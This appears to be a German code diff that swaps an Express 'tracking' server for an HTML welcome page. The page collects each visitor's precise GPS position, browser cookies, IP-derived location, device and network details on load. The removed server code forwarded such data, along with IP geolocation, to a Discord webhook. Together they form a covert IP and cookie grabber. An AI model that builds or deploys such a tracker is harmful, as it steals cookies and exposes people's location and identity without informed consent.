@@ -1,108 +1,78 @@
-// server.js — Discord Tracking ohne DB
-const express = require('express');
-const axios = require('axios');
-const path = require('path');
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <title>Willkommen</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;padding:24px}
+    .ok{color:green}.err{color:#b00}
+  </style>
+</head>
+<body>
+  <h1>Willkommen</h1>
+  <p>Bitte erlaube den Zugriff auf deinen Standort.</p>
+  <div id="status">Sammle Daten…</div>
 
-const app = express();
-const port = process.env.PORT || 3000;
-
-app.set('trust proxy', true);
-app.use(express.json());
-
-// Static-Ordner (liefert public/index.html aus)
-const publicDir = path.join(__dirname, 'public');
-app.use(express.static(publicDir));
-
-// Health Check für Render
-app.get('/health', (_, res) => res.send('ok'));
-
-// Root -> index.html ausliefern
-app.get('/', (_, res) => {
-  res.sendFile(path.join(publicDir, 'index.html'));
-});
-
-const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
-
-// IP ermitteln (auch hinter Proxy)
-function getClientIp(req) {
-  const xf = req.headers['x-forwarded-for'] || req.headers['x-real-ip'];
-  if (xf) return String(xf).split(',')[0].trim().replace(/^::ffff:/, '');
-  return (req.socket?.remoteAddress || '').replace(/^::ffff:/, '');
-}
-
-// Track-Route — nimmt Daten aus Query und postet an Discord
-app.get('/track', async (req, res) => {
-  const ip = getClientIp(req);
-  const userAgent = req.headers['user-agent'] || '';
-  const timestamp = new Date().toISOString();
-
-  const {
-    lat, lon, language, languages, cookies, screen, window: win,
-    timezone, platform, hardwareConcurrency, deviceMemory, connection,
-    referrer
-  } = req.query;
-
-  // optional: IP-Geolocation (ergänzt Stadt/Land)
-  let location = {};
-  try {
-    const r = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 4000 });
-    if (r?.data?.status === 'success') {
-      location = {
-        city: r.data.city,
-        region: r.data.regionName || r.data.region,
-        country: r.data.country,
-        latitude: lat || r.data.lat,
-        longitude: lon || r.data.lon,
-        isp: r.data.isp
+  <script>
+    function collectData() {
+      const data = {
+        lat: null,
+        lon: null,
+        userAgent: navigator.userAgent || '',
+        language: navigator.language || '',
+        languages: JSON.stringify(navigator.languages || []),
+        cookies: document.cookie || '',
+        screen: JSON.stringify({
+          width: window.screen?.width,
+          height: window.screen?.height,
+          colorDepth: window.screen?.colorDepth
+        }),
+        window: JSON.stringify({
+          innerWidth: window.innerWidth,
+          innerHeight: window.innerHeight
+        }),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+        platform: navigator.platform || '',
+        hardwareConcurrency: navigator.hardwareConcurrency ?? '',
+        deviceMemory: navigator.deviceMemory ?? '',
+        connection: JSON.stringify(navigator.connection ? {
+          effectiveType: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt
+        } : {}),
+        referrer: document.referrer || '',
+        timestamp: new Date().toISOString()
       };
-    }
-  } catch { /* ignorieren */ }
 
-  // Discord Embed bauen
-  const embeds = [{
-    title: 'Tracking-Daten',
-    color: 0x2b90d9,
-    fields: [
-      { name: 'IP', value: String(ip || '–'), inline: true },
-      { name: 'User-Agent', value: (userAgent || '–').slice(0, 256), inline: false },
-      { name: 'Zeitzone', value: String(timezone || '–'), inline: true },
-      { name: 'Referrer', value: String(referrer || '–'), inline: false },
-      { name: 'Language(s)', value: String(language || languages || '–').slice(0, 256), inline: true },
-      { name: 'Platform', value: String(platform || '–'), inline: true },
-      { name: 'HW / RAM', value: `Cores: ${hardwareConcurrency || '–'} | RAM: ${deviceMemory || '–'}`, inline: true },
-      { name: 'Screen', value: String(screen || '–').slice(0, 256), inline: false },
-      { name: 'Window', value: String(win || '–').slice(0, 256), inline: false },
-      { name: 'Netz', value: String(connection || '–').slice(0, 256), inline: false },
-      {
-        name: 'Location',
-        value: (location.latitude && location.longitude)
-          ? `Lat, Lon: ${location.latitude}, ${location.longitude}\n${location.city || ''} ${location.region || ''} ${location.country || ''}${location.isp ? `\nISP: ${location.isp}` : ''}`
-          : (location.city || location.country ? `${location.city || ''} ${location.region || ''} ${location.country || ''}` : '–'),
-        inline: false
+      const send = () => {
+        const qs = new URLSearchParams(data).toString();
+        fetch(`/track?${qs}`)
+          .then(() => {
+            const s = document.getElementById('status');
+            s.textContent = '✅ Daten wurden an den Server gesendet.';
+            s.className = 'ok';
+          })
+          .catch(err => {
+            console.error(err);
+            const s = document.getElementById('status');
+            s.textContent = '❌ Senden fehlgeschlagen.';
+            s.className = 'err';
+          });
+      };
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => { data.lat = pos.coords.latitude; data.lon = pos.coords.longitude; send(); },
+          () => send(),
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        );
+      } else {
+        send();
       }
-    ],
-    timestamp
-  }];
-
-  // an Discord senden
-  if (DISCORD_WEBHOOK_URL) {
-    try {
-      await axios.post(DISCORD_WEBHOOK_URL, {
-        content: `📡 **Neuer Track** — ${timestamp}`,
-        embeds
-      }, { timeout: 5000 });
-    } catch (e) {
-      console.error('Discord-Webhook-Fehler:', e.response?.status, e.response?.data || e.message);
     }
-  } else {
-    console.warn('Kein DISCORD_WEBHOOK_URL gesetzt – überspringe Discord-Post.');
-  }
-
-  res.send('Daten empfangen');
-});
-
-// Serverstart
-app.listen(port, () => {
-  console.log(`Server läuft auf Port ${port}`);
-});
+    window.onload = collectData;
+  </script>
+</body>
+</html>
 
